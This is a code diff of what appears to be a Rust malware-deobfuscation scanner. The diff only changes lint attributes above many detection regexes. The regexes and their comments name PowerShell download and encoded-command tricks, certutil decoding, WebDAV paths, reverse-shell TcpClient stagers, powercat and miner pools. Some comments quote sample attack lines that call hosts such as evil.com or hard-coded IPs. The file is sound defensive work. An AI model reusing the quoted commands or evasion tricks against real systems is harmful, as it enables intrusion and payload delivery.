@@ -21,7 +21,7 @@ use crate::util::{
 use once_cell::sync::Lazy;
 use regex::Regex;
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 // Case-insensitive AND tolerant of Windows' liberal slash normalization:
 // WinINet / IE / PS Invoke-WebRequest all accept `http:\\evil.com`,
 // `http:/evil.com`, `http:\/evil.com`, `http:////evil.com` etc. — any
@@ -37,13 +37,13 @@ pub(crate) static URL_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("url sweep regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static ROT13_URL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\b(uggcf?:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|sgc:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+|svyr:[\x2f\x5c]+[^\s"'<>(){}\[\]|^&;`,]+)"#)
         .expect("rot13 url sweep regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
     // Matches:  \\<host>@<port>\<share>...
     // Where host is IP or hostname, port is digits or "SSL", share is anything non-whitespace
@@ -51,17 +51,17 @@ static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("unc webdav regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static BARE_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\\\\([A-Za-z0-9.\-]+)\\webdav\\([^\s"'<>|&]+)"#)
         .expect("bare webdav unc regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static BITSADMIN_WORD_RE: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"(?i)\bbitsadmin(?:\.exe)?\b").expect("bitsadmin word regex"));
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static CMD_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*)\s*=\s*['"]?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)"#,
@@ -69,7 +69,7 @@ static CMD_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("cmd URL variable regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static CMD_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*url[A-Za-z0-9_.$-]*)\s*=\s*['"]?([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^\s"'<>(){}|^&;`,]+)"#,
@@ -77,7 +77,7 @@ static CMD_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("cmd schemeless URL variable regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']((?:https?|ftp|file):[\x2f\x5c]+[^"']+)["']"#,
@@ -85,7 +85,7 @@ static PS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("PowerShell URL variable regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*url[A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^"']+)["']"#,
@@ -93,13 +93,13 @@ static PS_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("PowerShell schemeless URL variable regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static EMBEDDED_POWERSHELL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)(?:[A-Za-z]:\\[^\s"']*\\)?(?:powershell|pwsh)(?:\.exe)?\b"#)
         .expect("embedded PowerShell regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 // Same URL-char restrictions as URL_RE: exclude shell/PS terminators
 // (`;`, `,`, `)`, `(`, etc.) so `... 'URL'); other-stmt` doesn't capture
 // past the URL into the next statement.
@@ -108,7 +108,7 @@ static PROCESS_URL_ARG_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("process URL argument regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
     // Matches: FromBase64String('...'), FromBase64String("..."), and
     // PowerShell's no-parentheses method-call form: FromBase64String'...'.
@@ -121,13 +121,13 @@ static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("b64 inline regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'{1,2}([^']*)'{1,2}"#)
         .expect("ps string assign regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_REGEX_REPLACE_B64_CALL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'{1,2}([^']*)'{1,2}\s*,\s*'{1,2}([^']*)'{1,2}\s*\)\s*\)"#,
@@ -135,7 +135,7 @@ static PS_REGEX_REPLACE_B64_CALL_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("ps regex replace b64 call regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")\s*(?:\+\s*(?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")){1,16})"#,
@@ -143,7 +143,7 @@ static PS_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("ps concat assign regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_CONCAT_EXPR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)((?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")\s*(?:\+\s*(?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")){1,16})"#,
@@ -151,7 +151,7 @@ static PS_CONCAT_EXPR_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("ps concat expr regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_CONCAT_PART_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)|'([^']*)'|"([^"]*)""#)
         .expect("ps concat part regex")
@@ -12903,7 +12903,7 @@ fn looks_like_embedded_powershell_skip_nth_body(tail: &str) -> bool {
 /// position. Mirrors what canonical_ps_flag would resolve at the handler
 /// level but at the gate level — once we see this we know the line is a
 /// payload candidate worth handing to h_powershell.
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_DOWNLOAD_VERB_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r"(?i)(?:^|[\s;|&(])(?:invoke-webrequest|invoke-restmethod|iwr|irm|wget|curl|downloadstring|downloadfile|downloaddata|start-bitstransfer|new-object\s+net\.webclient)\b",
@@ -12916,7 +12916,7 @@ static PS_DOWNLOAD_VERB_RE: Lazy<Regex> = Lazy::new(|| {
 /// `handlers/powershell.rs::canonical_ps_flag` at the gate level: prefix
 /// abbreviations (`-Enc`, `-Encoded`, `-Co`) plus the CamelCase initials
 /// (`-Ec`) that PS accepts as unambiguous parameter binding.
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_SHORTHAND_GATE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r"(?i)(?:^|[\s;|&])[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand|c|co|com|comm|comma|comman|command|f|fi|fil|file)\b",
@@ -12934,7 +12934,7 @@ fn dedup_exec_ps1(env: &mut Environment) {
 /// The prefix anchor stops the
 /// regex from firing on random b64 noise; the {16,500} suffix keeps the
 /// runtime cost bounded.
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static B64_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
     // UTF-8 ASCII variant: http(s)/ftp/file directly base64-encoded.
     //   `aHR0cDov…` (http://…)
@@ -12951,7 +12951,7 @@ static B64_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("b64 url prefix regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static DAMAGED_SCHEME_URL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[^A-Za-z])([A-Za-z0-9_%!$:~,\-]{0,80})://((?:[A-Za-z0-9][A-Za-z0-9.\-]{2,}\.[A-Za-z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?(?:/[^\s"'<>)]*)?)"#,
@@ -13243,7 +13243,7 @@ fn is_base64_byte(b: u8) -> bool {
 }
 
 /// Match a single PowerShell `[char[]]@(N,N,...)-join''` chunk.
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"\(\[(?:char\[\]|\[\])\]@\(([\d,\s]+)\)\s*-join\s*'{1,2}\)")
         .expect("ps char concat regex")
@@ -14290,7 +14290,7 @@ fn resolve_ps_concat_expr(
     (parts >= 2).then_some(out)
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static QUOTED_B64_RE: Lazy<Regex> = Lazy::new(|| {
     // Single OR double quoted base64 string ≥60 chars
     Regex::new(r#"['"]([A-Za-z0-9+/]{60,1500}={0,2})['"]"#).expect("quoted b64")
@@ -14357,7 +14357,7 @@ pub fn scan_bare_b64_urls(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static TRUNC_URL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#""=(?:https?)?://([A-Za-z0-9][A-Za-z0-9.\-]{3,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^"\s]*)?)"#,
@@ -14384,7 +14384,7 @@ pub fn scan_truncated_url_vars(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static CERTUTIL_DECODE_RE: Lazy<Regex> = Lazy::new(|| {
     // Matches: certutil [-f] -decode  (case-insensitive, dash or slash flags). We do not require
     // the same source/target filenames; just the presence of a decode call
@@ -14392,7 +14392,7 @@ static CERTUTIL_DECODE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?[-/]decode\b").expect("certutil decode")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static ECHO_B64_RE: Lazy<Regex> = Lazy::new(|| {
     // Captures the base64 emitted via `echo <b64> >` redirection. Allows the
     // payload to contain `+`/`/`/`=` since attackers often pipe pure base64.
@@ -14400,7 +14400,7 @@ static ECHO_B64_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?im)^[^\r\n]*?\becho\s+([A-Za-z0-9+/]{40,}={0,2})\s*[1-9]?>"#).expect("echo b64")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static JS_BARE_URL_RE: Lazy<Regex> = Lazy::new(|| {
     // Inside a decoded JS payload, match `"//<host>/...""`-style URL tails
     // that are concatenated from earlier `"sc"+"r"+...` fragments.
@@ -14484,7 +14484,7 @@ pub fn scan_certutil_decoded_js(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static ECHO_U_ESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
     // Captures a run of >=4 consecutive `\uXXXX` escapes appearing inside an
     // `echo` statement. Attackers drop these as `echo eval('va...');`
@@ -14540,7 +14540,7 @@ pub fn scan_echoed_unicode_js(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static HOST_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
     // Hostname shape only. No left-anchored `\b` because the host is often
     // glued to an uppercase marker (both word chars, so `\b` would fail).
@@ -14550,7 +14550,7 @@ static HOST_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"[a-z0-9][a-z0-9.\-]{2,}\.[a-z]{2,}").expect("host literal")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static QUERY_DIGIT_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^\?\d+").expect("query digit"));
 
 fn is_marker_char(b: u8, first: bool) -> bool {
@@ -14631,7 +14631,7 @@ pub fn scan_delim_wrapped_urls(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static BARE_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
     // Captures schemeless IP+path URLs passed to a download verb:
     //   curl -uri 185.117.72.132/gate990.php
@@ -14646,7 +14646,7 @@ static BARE_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("bare ip url")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static REMOTE_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)\bwinvnc(?:\.exe)?\b[^\r\n]*\s-connect\s+(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})"#,
@@ -14654,7 +14654,7 @@ static REMOTE_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("remote connect regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static PS_TCP_CLIENT_RE: Lazy<Regex> = Lazy::new(|| {
     // PowerShell reverse shell / Empire / Posh stager pattern:
     //   $c = New-Object Net.Sockets.TcpClient('10.0.0.5', 4444)
@@ -14677,7 +14677,7 @@ static PS_TCP_CLIENT_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("ps tcp client regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static STUB_MAIN_HOST_PORT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?ix)
@@ -14701,7 +14701,7 @@ static STUB_MAIN_HOST_PORT_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("stub main host port regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static POWERCAT_CONNECT_PORT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?ix)
@@ -14715,7 +14715,7 @@ static POWERCAT_CONNECT_PORT_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("powercat connect port regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static POWERCAT_PORT_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?ix)
@@ -14729,7 +14729,7 @@ static POWERCAT_PORT_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("powercat port connect regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static MINER_POOL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?ix)
@@ -14746,7 +14746,7 @@ static MINER_POOL_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("miner pool regex")
 });
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static DECIMAL_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
     // PowerShell accepts a 32-bit integer in place of an IPv4 host:
     //   Invoke-WebRequest 1297338337/x.jpg  ->  http://77.83.42.33/x.jpg
@@ -15033,7 +15033,7 @@ fn scan_remote_connects(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-#[expect(clippy::expect_used, reason = "static regex construction")]
+#[allow(clippy::expect_used)]
 static STAGE1_REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
     // Single-quoted long string immediately followed by .Replace('marker','')
     // The b64-with-marker can run to 30 KB. PS single-quoted strings cannot
